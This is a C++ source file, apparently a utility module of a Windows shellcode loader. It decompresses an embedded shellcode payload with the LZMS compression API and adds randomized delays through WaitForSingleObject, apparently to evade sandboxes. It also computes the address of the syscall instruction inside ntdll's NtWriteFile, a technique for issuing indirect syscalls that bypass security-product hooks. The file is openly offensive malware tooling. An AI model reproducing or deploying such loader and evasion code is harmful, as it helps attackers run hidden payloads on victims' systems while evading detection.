#include <Windows.h>
#include <compressapi.h>
#include <intrin.h>

#pragma comment(lib, "cabinet.lib")

#include "util.h"
#include "shellcode.h"

static DWORD randomInt(DWORD min, DWORD max)
{
	return rand() % (max - min + 1) + min;
}

VOID Delay(DWORD time)
{
#ifndef _DEBUG
	DWORD randTime = randomInt(time-50, time+20);
	DEBUG_LOG("Sleeping for %lums\n", randTime);

	//Sleep(randTime);
	WaitForSingleObject(CURRENT_THREAD, randTime);
#endif
}

PUCHAR DecompressShellcode(PSIZE_T pShellcodeLength)
{
	*pShellcodeLength = 0;

	DECOMPRESSOR_HANDLE cmp;
	if (!CreateDecompressor(COMPRESS_ALGORITHM_LZMS, nullptr, &cmp))
	{
		DEBUG_LOG("Failed to create decompressor: 0x%lu\n", GetLastError());
		return nullptr;
	}

	PUCHAR decompressedShellcode = (PUCHAR)calloc(SHELLCODE_LENGTH, sizeof(UCHAR));
	if (!Decompress(
		cmp,
		SHELLCODE,
		sizeof(SHELLCODE),
		decompressedShellcode,
		SHELLCODE_LENGTH,
		nullptr
	))
	{
		DEBUG_LOG("Failed to decompress shellcode: 0x%lu\n", GetLastError());
		free(decompressedShellcode);
		return nullptr;
	}

	*pShellcodeLength = SHELLCODE_LENGTH;
	return decompressedShellcode;
}

UINT_PTR GetSyscallInst()
{
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL)
	{
		DEBUG_LOG("Failed to get handle to ntdll.dll: 0x%lu\n", GetLastError());
		return 0;
	}

	UINT_PTR pNtWriteFile = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteFile");
	if (pNtWriteFile == 0)
	{
		DEBUG_LOG("Failed to get address of NtWriteFile: 0x%lu\n", GetLastError());
		return 0;
	}

    /*
    NtWriteFile:
		4C 8B D1                          mov     r10, rcx
		B8 08 00 00 00                    mov     eax, 8
		F6 04 25 08 03 FE                 test    byte ptr ds:7FFE0308h, 1
		7F 01
		75 03                             jnz     short loc_18009F465
		0F 05                             syscall
    */
    return pNtWriteFile + 18;
}
